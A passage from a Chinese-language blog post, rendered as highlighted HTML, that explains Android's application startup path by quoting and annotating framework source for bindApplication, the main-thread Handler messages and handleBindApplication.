<br>&#125;<br></code></pre></td></tr></table></figure><p>最后一步表明只要对端进程挂掉，Binder是在底层可以从todo链表中拿出来client的信息，然后调用对应的回调方法</p><p>接下来看第六步，绑定应用</p><p>thread.bindApplication</p><p>调用原理跟上面一样，这里就不在继续阐述了，最终会调用到APT.bindApplication</p><h4 id="4-4-15-APT-bindApplication"><a href="#4-4-15-APT-bindApplication" class="headerlink" title="4.4.15 APT.bindApplication()"></a>4.4.15 APT.bindApplication()</h4><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">public</span> final void bindApplication(<span class="hljs-type">String</span> processName, <span class="hljs-type">ApplicationInfo</span> appInfo,<br>                <span class="hljs-type">List</span>&lt;<span class="hljs-type">ProviderInfo</span>&gt; providers, <span class="hljs-type">ComponentName</span> instrumentationName,<br>                <span class="hljs-type">ProfilerInfo</span> profilerInfo, <span class="hljs-type">Bundle</span> instrumentationArgs,<br>                <span class="hljs-type">IInstrumentationWatcher</span> instrumentationWatcher,<br>                <span class="hljs-type">IUiAutomationConnection</span> instrumentationUiConnection, int debugMode,<br>                boolean enableBinderTracking, boolean trackAllocation,<br>                boolean isRestrictedBackupMode, boolean persistent, <span class="hljs-type">Configuration</span> config,<br>                <span class="hljs-type">CompatibilityInfo</span> compatInfo, <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">IBinder</span>&gt; services, <span class="hljs-type">Bundle</span> coreSettings) &#123;<br><br>            <span class="hljs-keyword">if</span> (services != null) &#123;<br>                // <span class="hljs-type">Setup</span> the service cache <span class="hljs-keyword">in</span> the <span class="hljs-type">ServiceManager</span><br>                <span class="hljs-type">ServiceManager</span>.initServiceCache(services);<br>            &#125;<br><br>            setCoreSettings(coreSettings);<br><br>            <span class="hljs-type">AppBindData</span> <span class="hljs-class"><span class="hljs-keyword">data</span> = new <span class="hljs-type">AppBindData</span>();</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.processName = processName;</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.appInfo = appInfo;</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.providers = providers;</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.instrumentationName = instrumentationName;</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.instrumentationArgs = instrumentationArgs;</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.instrumentationWatcher = instrumentationWatcher;</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.instrumentationUiAutomationConnection = instrumentationUiConnection;</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.debugMode = debugMode;</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.enableBinderTracking = enableBinderTracking;</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.trackAllocation = trackAllocation;</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.restrictedBackupMode = isRestrictedBackupMode;</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.persistent = persistent;</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.config = config;</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.compatInfo = compatInfo;</span><br>            <span class="hljs-class"><span class="hljs-keyword">data</span>.initProfilerInfo = profilerInfo;</span><br>            sendMessage(<span class="hljs-type">H</span>.<span class="hljs-type">BIND_APPLICATION</span>, <span class="hljs-class"><span class="hljs-keyword">data</span>);</span><br>        &#125;<br>        <br>        public void setCoreSettings(<span class="hljs-type">Bundle</span> coreSettings) &#123;<br>            sendMessage(<span class="hljs-type">H</span>.<span class="hljs-type">SET_CORE_SETTINGS</span>, coreSettings);<br>        &#125;<br></code></pre></td></tr></table></figure><p>这里通过handler向主线程（AT）发送了两条消息SET_CORE_SETTINGS，BIND_APPLICATION</p><h4 id="4-4-16-AT-H-SET-CORE-SETTINGS、AT-H-BIND-APPLICATION"><a href="#4-4-16-AT-H-SET-CORE-SETTINGS、AT-H-BIND-APPLICATION" class="headerlink" title="4.4.16 AT.H.SET_CORE_SETTINGS、AT.H.BIND_APPLICATION"></a>4.4.16 AT.H.SET_CORE_SETTINGS、AT.H.BIND_APPLICATION</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> H extends Handler &#123;<br><br>public void handle<span class="hljs-constructor">Message(Message <span class="hljs-params">msg</span>)</span> &#123;<br><br>            switch (msg.what) &#123;<br>            case SET_CORE_SETTINGS:<br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Trace</span>.</span></span>trace<span class="hljs-constructor">Begin(Trace.TRACE_TAG_ACTIVITY_MANAGER, <span class="hljs-string">&quot;setCoreSettings&quot;</span>)</span>;<br>                    handle<span class="hljs-constructor">SetCoreSettings((Bundle)</span> msg.obj);<br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Trace</span>.</span></span>trace<span class="hljs-constructor">End(Trace.TRACE_TAG_ACTIVITY_MANAGER)</span>;<br>                    break;<br>            case BIND_APPLICATION:<br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Trace</span>.</span></span>trace<span class="hljs-constructor">Begin(Trace.TRACE_TAG_ACTIVITY_MANAGER, <span class="hljs-string">&quot;bindApplication&quot;</span>)</span>;<br>                    AppBindData data = (AppBindData)msg.obj;<br>                    handle<span class="hljs-constructor">BindApplication(<span class="hljs-params">data</span>)</span>;<br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Trace</span>.</span></span>trace<span class="hljs-constructor">End(Trace.TRACE_TAG_ACTIVITY_MANAGER)</span>;<br>                    break;<br>            &#125;<br>      &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-4-17-AT-handleSetCoreSettings"><a href="#4-4-17-AT-handleSetCoreSettings" class="headerlink" title="4.4.17 AT.handleSetCoreSettings()"></a>4.4.17 AT.handleSetCoreSettings()</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> void handle<span class="hljs-constructor">SetCoreSettings(Bundle <span class="hljs-params">coreSettings</span>)</span> &#123;<br>        synchronized (mResourcesManager) &#123;<br>            mCoreSettings = coreSettings;<br>        &#125;<br>        on<span class="hljs-constructor">CoreSettingsChange()</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> void on<span class="hljs-constructor">CoreSettingsChange()</span> &#123;<br>        boolean debugViewAttributes =<br>                mCoreSettings.get<span class="hljs-constructor">Int(Settings.Global.DEBUG_VIEW_ATTRIBUTES, 0)</span> != <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (debugViewAttributes != <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">View</span>.</span></span>mDebugViewAttributes) &#123;<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">View</span>.</span></span>mDebugViewAttributes = debugViewAttributes;<br><br>            <span class="hljs-comment">// 要求所有activity重启以进行更改</span><br>            <span class="hljs-keyword">for</span> (Map.Entry&lt;IBinder, ActivityClientRecord&gt; entry : mActivities.entry<span class="hljs-constructor">Set()</span>) &#123;<br>                request<span class="hljs-constructor">RelaunchActivity(<span class="hljs-params">entry</span>.<span class="hljs-params">getKey</span>()</span>, null, null, <span class="hljs-number">0</span>, <span class="hljs-literal">false</span>, null, null, <span class="hljs-literal">false</span>,<br>                        <span class="hljs-literal">false</span> <span class="hljs-comment">/* preserveWindow */</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="4-4-18-AT-handleBindApplication"><a href="#4-4-18-AT-handleBindApplication" class="headerlink" title="4.4.18 AT.handleBindApplication()"></a>4.4.18 AT.handleBindApplication()</h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">private</span> void handleBindApplication(AppBindData <span class="hljs-keyword">data</span>) &#123;<br><br>        <span class="hljs-comment">// 将UI线程作为sensitive thread 注册到虚拟机.</span><br>        VMRuntime.registerSensitiveThread();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">data</span>.trackAllocation) &#123;<br>            DdmVmInternal.enableRecentAllocations(<span class="hljs-literal">true</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// 设置进程启动时间</span><br>        Process.setStartTimes(SystemClock.elapsedRealtime(), SystemClock.uptimeMillis());<br><br>        mBoundApplication = <span class="hljs-keyword">data</span>;<br>        mConfiguration = new Configuration(<span class="hljs-keyword">data</span>.config);<br>        mCompatConfiguration = new Configuration(<span class="hljs-keyword">data</span>.config);<br><br>        mProfiler = new Profiler();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">data</span>.initProfilerInfo != <span class="hljs-literal">null</span>) &#123;<br>            mProfiler.profileFile = <span class="hljs-keyword">data</span>.initProfilerInfo.profileFile;<br>            mProfiler.profileFd = <span class="hljs-keyword">data</span>.initProfilerInfo.profileFd;<br>            mProfiler.samplingInterval = <span class="hljs-keyword">data</span>.initProfilerInfo.samplingInterval;<br>            mProfiler.autoStopProfiler = <span class="hljs-keyword">data</span>.initProfilerInfo.autoStopProfiler;<br>        &#125;<br><br>        <span class="hljs-comment">// 设置进程名, 也就是说进程名是在进程真正创建以后的BIND_APPLICATION过程中才取名</span><br>        Process.setArgV0(<span class="hljs-keyword">data</span>.processName);<br>        android.ddm.DdmHandleAppName.setAppName(<span class="hljs-keyword">data</span>.processName,<br>                                                UserHandle.myUserId());<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">data</span>.persistent) &#123;<br>            <span class="hljs-comment">// Persistent processes on 在低内存设备上无法使用硬件加速绘图，禁用以节省内存</span><br>            <span class="hljs-keyword">if</span> (!ActivityManager.isHighEndGfx()) &#123;<br>                ThreadedRenderer.disable(<span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (mProfiler.profileFd != <span class="hljs-literal">null</span>) &#123;<br>            mProfiler.startProfiling();<br>        &#125;<br><br>        <span class="hljs-comment">// 如果sdk版本在Android3.1.x(API12)或更早版本，需要设置Asynctask中使用的线程池，这样任务是并行执行，在高版本是串行执行</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">data</span>.appInfo.targetSdkVersion &lt;= android.os.Build.VERSION_CODES.HONEYCOMB_MR1) &#123;<br>            AsyncTask.setDefaultExecutor(AsyncTask.THREAD_POOL_EXECUTOR);<br>        &#125;<br><br><span class="hljs-comment">//如果版本大于LOLLIPOP，就不支持回收正在使用的Message</span><br>        Message.updateCheckRecycle(<span class="hljs-keyword">data</span>.appInfo.targetSdkVersion);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * 重置时区</span><br><span class="hljs-comment">         */</span><br>        TimeZone.setDefault(<span class="hljs-literal">null</span>);<br>        LocaleList.setDefault(<span class="hljs-keyword">data</span>.config.getLocales());<br><br>        synchronized (mResourcesManager) &#123;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">             * 更新系统配置</span><br><span class="hljs-comment">             */</span><br>            mResourcesManager.applyConfigurationToResourcesLocked(<span class="hljs-keyword">data</span>.config, <span class="hljs-keyword">data</span>.compatInfo);<br>            mCurDefaultDisplayDpi = <span class="hljs-keyword">data</span>.config.densityDpi;<br>            applyCompatConfiguration(mCurDefaultDisplayDpi);<br>        &#125;<br><br><span class="hljs-comment">//获取LoadedApk对象</span><br>        <span class="hljs-keyword">data</span>.info = getPackageInfoNoCheck(<span class="hljs-keyword">data</span>.appInfo, <span class="hljs-keyword">data</span>.compatInfo);<br>        <br><span class="hljs-comment">//api11以后禁止在主线程使用网络</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">data</span>.appInfo.targetSdkVersion &gt;= Build.VERSION_CODES.HONEYCOMB) &#123;<br>            StrictMode.enableDeathOnNetwork();<br>        &#125;<br>        <br><span class="hljs-comment">//api24及以后禁止使用file://这种格式的Uri；引入Fileprovide</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">data</span>.appInfo.targetSdkVersion &gt;= Build.VERSION_CODES.N) &#123;<br>            StrictMode.enableDeathOnFileUriExposure();<br>        &#125;<br>       ......<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 因为前面重置了时区，所以这里需要初始化http代理.</span><br><span class="hljs-comment">         * 这里也是AIDL的运用</span><br><span class="hljs-comment">         */</span><br>        Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, <span class="hljs-string">&quot;Setup proxies&quot;</span>);<br>        <span class="hljs-keyword">final</span> IBinder b = ServiceManager.getService(Context.CONNECTIVITY_SERVICE);<br>        <span class="hljs-keyword">if</span> (b != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">final</span> IConnectivityManager service = IConnectivityManager.Stub.asInterface(b);<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">final</span> ProxyInfo proxyInfo = service.getProxyForNetwork(<span class="hljs-literal">null</span>);<br>                Proxy.setHttpProxySystemProperty(proxyInfo);<br>            &#125; <span class="hljs-keyword">catch</span> (RemoteException e) &#123;<br>                Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);<br>                <span class="hljs-keyword">throw</span> e.rethrowFromSystemServer();<br>            &#125;<br>        &#125;<br>        Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);<br><br>        <span class="hljs-comment">// Instrumentation会影响类加载器，所以在设置app的context之前初始化.</span><br>        <span class="hljs-keyword">final</span> InstrumentationInfo ii;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">data</span>.instrumentationName != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                ii = new ApplicationPackageManager(<span class="hljs-literal">null</span>, getPackageManager())<br>                        .getInstrumentationInfo(<span class="hljs-keyword">data</span>.instrumentationName, <span class="hljs-number">0</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;<br>                <span class="hljs-keyword">throw</span> new RuntimeException(<br>                        <span class="hljs-string">&quot;Unable to find instrumentation info for: &quot;</span> + <span class="hljs-keyword">data</span>.instrumentationName);<br>            &#125;<br><br>            mInstrumentationPackageName = ii.packageName;<br>            mInstrumentationAppDir = ii.sourceDir;<br>            mInstrumentationSplitAppDirs = ii.splitSourceDirs;<br>            mInstrumentationLibDir = getInstrumentationLibrary(<span class="hljs-keyword">data</span>.appInfo, ii);<br>            mInstrumentedAppDir = <span class="hljs-keyword">data</span>.info.getAppDir();<br>            mInstrumentedSplitAppDirs = <span class="hljs-keyword">data</span>.info.getSplitAppDirs();<br>            mInstrumentedLibDir = <span class="hljs-keyword">data</span>.info.getLibDir();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            ii = <span class="hljs-literal">null</span>;<br>        &#125;<br>        <br><span class="hljs-comment">//创建ContextImpl上下文</span><br>        <span class="hljs-keyword">final</span> ContextImpl appContext = ContextImpl.createAppContext(<span class="hljs-keyword">this</span>, <span class="hljs-keyword">data</span>.info);<br>        updateLocaleListFromAppContext(appContext,<br>                mResourcesManager.getConfiguration().getLocales());<br><br>        <span class="hljs-keyword">if</span> (!Process.isIsolated() &amp;&amp; !<span class="hljs-string">&quot;android&quot;</span>.equals(appContext.getPackageName())) &#123;<br>            <span class="hljs-keyword">final</span> File cacheDir = appContext.getCacheDir();<br>            <span class="hljs-keyword">if</span> (cacheDir != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// 设置临时文件缓存目录</span><br>                System.setProperty(<span class="hljs-string">&quot;java.io.tmpdir&quot;</span>, cacheDir.getAbsolutePath());<br>            &#125; <br>            <span class="hljs-comment">// 设置 generated/compiled graphics code 的缓存位置.</span><br>            <span class="hljs-keyword">final</span> Context deviceContext = appContext.createDeviceProtectedStorageContext();<br>            <span class="hljs-keyword">final</span> File codeCacheDir = deviceContext.getCodeCacheDir();<br>            <span class="hljs-keyword">if</span> (codeCacheDir != <span class="hljs-literal">null</span>) &#123;<br>                setupGraphicsSupport(<span class="hljs-keyword">data</span>.info, codeCacheDir);<br>            &#125; <br>        &#125;<br><br>        <span class="hljs-comment">// 安装 Network Security Config Provider. 必须在应用程序代码加载前安装</span><br>        NetworkSecurityConfigProvider.install(appContext);<br><br>        <span class="hljs-comment">// 继续实例化instrumentation.</span><br>        <span class="hljs-keyword">if</span> (ii != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">final</span> ApplicationInfo instrApp = new ApplicationInfo();<br>            ii.copyTo(instrApp);<br>            instrApp.initForUser(UserHandle.myUserId());<br>            <span class="hljs-keyword">final</span> LoadedApk pi = getPackageInfo(instrApp, <span class="hljs-keyword">data</span>.compatInfo,<br>                    appContext.getClassLoader(), <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);<br>            <span class="hljs-keyword">final</span> ContextImpl instrContext = ContextImpl.createAppContext(<span class="hljs-keyword">this</span>, pi);<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">final</span> ClassLoader cl = instrContext.getClassLoader();<br>                mInstrumentation = (Instrumentation)<br>                    cl.loadClass(<span class="hljs-keyword">data</span>.instrumentationName.getClassName()).newInstance();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                <span class="hljs-keyword">throw</span> new RuntimeException(<br>                    <span class="hljs-string">&quot;Unable to instantiate instrumentation &quot;</span><br>                    + <span class="hljs-keyword">data</span>.instrumentationName + <span class="hljs-string">&quot;: &quot;</span> + e.toString(), e);<br>            &#125;<br><br>            <span class="hljs-keyword">final</span> ComponentName component = new ComponentName(ii.packageName, ii.name);<br>            mInstrumentation.<span class="hljs-keyword">init</span>(<span class="hljs-keyword">this</span>, instrContext, appContext, component,<br>                    <span class="hljs-keyword">data</span>.instrumentationWatcher, <span class="hljs-keyword">data</span>.instrumentationUiAutomationConnection);<br><br>            <span class="hljs-keyword">if</span> (mProfiler.profileFile != <span class="hljs-literal">null</span> &amp;&amp; !ii.handleProfiling<br>                    &amp;&amp; mProfiler.profileFd == <span class="hljs-literal">null</span>) &#123;<br>                mProfiler.handlingProfiling = <span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">final</span> File file = new File(mProfiler.profileFile);<br>                file.getParentFile().mkdirs();<br>                Debug.startMethodTracing(file.toString(), <span class="hljs-number">8</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//第一次进来肯定是null，在这里实例化，所有activity的生命周期方法回调前都会调用该对象相关方法</span><br>            mInstrumentation = new Instrumentation();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">data</span>.appInfo.flags&amp;ApplicationInfo.FLAG_LARGE_HEAP) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">//清除内存增长上限</span><br>            dalvik.system.VMRuntime.getRuntime().clearGrowthLimit();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Small heap, clamp to the current growth limit and let the heap release</span><br>            <span class="hljs-comment">// pages after the growth limit to the non growth limit capacity. b/18387825</span><br>            dalvik.system.VMRuntime.getRuntime().clampGrowthLimit();<br>        &#125;<br><br>        <span class="hljs-comment">// 应用程序和provider在设置期间允许磁盘访问，这有可能会阻塞ordered broadcasts的处理</span><br>        <span class="hljs-keyword">final</span> StrictMode.ThreadPolicy savedPolicy = StrictMode.allowThreadDiskWrites();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 此处data.info是指LoadedApk, 通过反射创建目标应用Application对象</span><br>            Application app = <span class="hljs-keyword">data</span>.info.makeApplication(<span class="hljs-keyword">data</span>.restrictedBackupMode, <span class="hljs-literal">null</span>);<br>            mInitialApplication = app;<br><br>            <span class="hljs-comment">// 不要在 restricted 模式中提供provider; 他们可能依赖于APP自定义的类</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">data</span>.restrictedBackupMode) &#123;<br>                <span class="hljs-keyword">if</span> (!ArrayUtils.isEmpty(<span class="hljs-keyword">data</span>.providers)) &#123;<br>                    installContentProviders(app, <span class="hljs-keyword">data</span>.providers);<br>                    <span class="hljs-comment">// 对于包含content provider的进程，我们希望在某个时刻启用JIT</span><br>                    mH.sendEmptyMessageDelayed(H.ENABLE_JIT, <span class="hljs-number">10</span>*<span class="hljs-number">1000</span>);<br>                &#125;<br>            &#125;<br><br><span class="hljs-comment">//在mInstrumentation启动时，在加载任何应用程序代码之前调用。 </span><br><span class="hljs-comment">//通常会被重写调用&#123;@link #start&#125;来开始检测线程，然后将继续在&#123;@link #onStart&#125;中执行。</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                mInstrumentation.onCreate(<span class="hljs-keyword">data</span>.instrumentationArgs);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                <span class="hljs-keyword">throw</span> new RuntimeException(<br>                    <span class="hljs-string">&quot;Exception thrown in onCreate() of &quot;</span><br>                    + <span class="hljs-keyword">data</span>.instrumentationName + <span class="hljs-string">&quot;: &quot;</span> + e.toString(), e);<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//调用Application.onCreate()回调方法</span><br>                mInstrumentation.callApplicationOnCreate(app);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                <span class="hljs-keyword">if</span> (!mInstrumentation.onException(app, e)) &#123;<br>                    <span class="hljs-keyword">throw</span> new RuntimeException(<br>                        <span class="hljs-string">&quot;Unable to create application &quot;</span> + app.getClass().getName()<br>                        + <span class="hljs-string">&quot;: &quot;</span> + e.toString(), e);<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            StrictMode.setThreadPolicy(savedPolicy);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个方法很长，工作内容如下：</p><ul><li>对进程基本参数的设置，比如进程名，时区，资源及兼容性设置；同时添加了对开发者的限制，如不能在主线程使用网络</li><li>通过getPackageInfoNoCheck获取LoadedApk对象</li><li>实例化ContextImpl，Instrumentation等对象</li><li>通过LoadedApk.makeApplication创建应用Application对象</li><li>调用Instrumentation.callApplicationOnCreate</li></ul><h4 id="4-4-19-AT-getPackageInfoNoCheck"><a href="#4-4-19-AT-getPackageInfoNoCheck" class="headerlink" title="4.4.19 AT.getPackageInfoNoCheck()"></a>4.4.19 AT.getPackageInfoNoCheck()</h4><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 